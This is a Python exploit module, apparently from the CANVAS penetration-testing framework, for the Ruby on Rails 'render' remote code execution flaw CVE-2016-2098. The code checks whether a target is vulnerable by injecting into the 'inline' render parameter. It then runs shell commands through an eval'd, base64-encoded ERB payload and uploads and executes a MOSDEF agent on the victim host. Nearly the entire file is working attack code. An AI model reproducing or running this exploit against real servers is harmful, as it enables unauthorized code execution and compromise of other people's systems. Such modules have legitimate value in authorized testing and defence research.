#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/products/canvas/index.html for more information

import sys
import time
import socket
import re

#covers both angles
if "." not in sys.path: sys.path.append(".")

import libs.spkproxy as spkproxy
import urllib
import base64

from tcpexploit import tcpexploit
from exploitutils import *
from ExploitTypes.CommandLineExecuter import CommandExploit

import logging

NAME                           = "rails_actionpack_render"
DESCRIPTION                    = "Ruby on Rails Render Remote Code Execution"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "http://rubyonrails.org"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2016-2098"
DOCUMENTATION["CVE URL"]       = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-2098"
DOCUMENTATION['CVSS']          = 7.5

DOCUMENTATION['Notes']         = """

This vulnerability affects ActionPack gem and it allows remote attackers to execute arbitrary Ruby Code due to the unsafe use of the 'render' method. Web applications that pass unverified user input to the 'render' method in a controller or a view could be vulnerable to code injection.
The first issue here is that the 'render' method accepts a hash parameter as input parameter. The second issue is triggered when the method receives a hash parameter with a key named as one of the render options such as html, plain, inline, etc. The method uses it in the same way as 'render key: value', for example if you use { 'plain' : 'HELLO' } as a parameter this is the same as calling 'render plain: "HELLO"'. Using { 'inline' : '<% SOME RUBY CODE %>' } will give you code execution.
The POST parameters seem to be non exploitable to this vulnerability due to the post_params method that checks all parameters against a whitelist.

"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ "Linux" ]
PROPERTY['VERSION']            = [ "All" ]

CHANGELOG                      = """
"""

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)

        self.host               = ""
        self.port               = 3000
        self.version            = 1
        self.name               = NAME

        self.hostname           = ""
        self.vhost              = ""
        self.protocol           = "http"
        self.basepath           = "/"
        self.param              = ""
        self.moreparams         = ""
        self.ssl                = False
        self.auth               = None
        self.username           = ""
        self.password           = ""
        self.cookies            = ""
        self.extraheaders       = ""
        self.vulnerable_target  = ""
        self.setVersions()
        self.supports_universal = True #for CommandExploits that support Universal MOSDEF (which you should!)

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def getargs(self):
        """
        Get arguments for attack.
        """
        self.getarg("hostname")
        self.getarg("port")
        self.getarg("vhost")
        self.getarg("ssl")
        self.getarg("basepath")
        self.getarg("param")
        self.getarg('moreparams')

        if self.ssl:
            self.protocol="https"

        if not self.basepath.startswith("/"):
            self.basepath="/"+self.basepath
        if not self.basepath.endswith("/"):
            self.basepath=self.basepath+"/"

        self.basicauth_user     = self.getarg("username")
        self.basicauth_password = self.getarg("password")
        self.getarg('cookies')

    def neededListenerTypes(self):
        return self.cle_neededListenerTypes()

    def setVersions(self):
        self.versions    = {}
        self.versions[1] = ["Rails 4.2.x"]
        self.versions[2] = ["Rails 4.1.x"]
        self.versions[3] = ["Rails 4.0.x"]
        self.versions[4] = ["Rails 3.2.x"]


    def is_vulnerable(self):
        status = False

        if self.basicauth_user:
            self.auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            self.auth = None

        if self.cookies:
            self.extraheaders = [("Cookie", self.cookies)]

        #Test GET request
        tag     = "RENDER-TEST-INJECTION"
        param_name = self.param + "[inline]"
        params = { param_name : tag }
        if self.moreparams:
            params = self.add_params(params, self.moreparams)
        urlencoded_params =  urllib.urlencode(params)
        request = self.basepath + "?" + urlencoded_params
        target = self.host
        if self.vhost:
            target = self.vhost
        url = self.protocol + '://' + target + ":%s" % self.port + request

        (res, responsecode) = spkproxy.urlopen(url, extraheaders=self.extraheaders, data="", exploit=self, entireresponse=True, return_response_code=True, auth=self.auth,verb="GET")
        response = res.read()

        if responsecode == 200 :
            if tag in response:
                status = True
                self.vulnerable_target = target
        if responsecode == 401 :
            if "WWW-Authenticate: Basic realm" in response:
                raise ValueError("Authentication Failed - Basic Realm detected: check username & password and try it again")
            else:
                raise ValueError("Authentication Failed - Not Basic Realm")

        return status

    def run_blind_command(self, command):
        cmd = "system('%s')" % command
        #inline ruby code
        rubycode = """'%s'.unpack("m0").first""" % b64encode(cmd).rstrip()
        payload = "<% eval("+str(rubycode)+")%>"
        param_name = self.param + "[inline]"
        params = { param_name : payload }
        if self.moreparams:
           params = self.add_params(params, self.moreparams)
        urlencoded_params =  urllib.urlencode(params)
        request = self.basepath + "?" + urlencoded_params
        url  = self.protocol + '://' + self.vulnerable_target + ":%s" % self.port + request
        spkproxy.urlopen(url, extraheaders=self.extraheaders, data="", exploit=self, noresponse=True, auth=self.auth, verb="GET")

        return True

    def add_params(self, params, moreparams):
        params_list = moreparams.split('&')
        for f in params_list:
            param, value = f.split('=')
            params[param] = value

        return params

    def run(self):
        self.getargs()
        self.host = self.target.interface
        self.setInfo("%s (in progress)" % (NAME))
        vulnerable = False
        try:
            vulnerable = self.is_vulnerable()
        except ValueError as err:
            logging.error("%s " % err.message )
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

        if not vulnerable:
            logging.error("%s doesn't seem to be vulnerable, aborting.." % self.host)
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0
        # set callback
        self.getargs_cle()
        # get OS
        self.get_os()
        if self.target_os != "Unknown":
           logging.info("Found target OS: %s" % self.target_os)
        else:
           logging.error("Could not find target OS!")
           return 0

        self.setProgress(40)
        #next we upload a MOSDEF executable and execute it
        self.upload_and_execute()

        if self.ISucceeded():
            logging.info("Got a new MOSDEF up and running!")
            self.setInfo("%s - done (success)" % (NAME))
            return 1
        else:
            logging.error('Failed')
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
